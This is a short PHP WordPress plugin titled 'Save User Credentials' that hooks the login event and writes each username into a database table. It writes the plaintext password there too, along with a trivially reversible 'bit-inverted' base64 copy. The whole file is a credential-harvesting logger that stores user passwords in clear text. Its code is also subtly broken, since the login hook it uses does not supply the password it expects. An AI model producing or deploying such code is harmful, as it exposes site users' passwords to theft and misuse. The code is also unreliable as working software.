<?php
/**
 * Plugin Name: Save User Credentials
 * Description: Плагин для сохранения имени пользователя и его пароля в таблицу
 * Version: 1.0
 * Author: Bakhtina Anastasia
 */

 if  (!defined('ABSPATH')) {
    exit;
 }

 global $wpdb;

function invert_bits($password) {
    $password_bytes = unpack('C*', $password);
    foreach ($password_bytes as &$byte) {
        $byte = ~$byte & 0xFF;
    }
    $inverted_password = pack('C*', ...$password_bytes);
    $encoded_password = base64_encode($inverted_password);
    return $encoded_password;
}

function save_user_credentials($username, $password) {
    global $wpdb;

    if (empty($username) || empty($password)) {
        return;
    }

    $table_name = 'user_credentials';
    $original_password = $password;
    $inverted_password = invert_bits($password);

    $result = $wpdb->insert(
        $table_name,
        array(
            'username' => $username,
            'original_password' => $original_password,
            'inverted_password' => $inverted_password
        ),
        array(
            '%s',
            '%s',
            '%s'
        )
    );
}

add_action('wp_login', 'custom_login_register', 10, 2);

function custom_login_register($username, $password) {
    save_user_credentials($username, $password);
}
?>
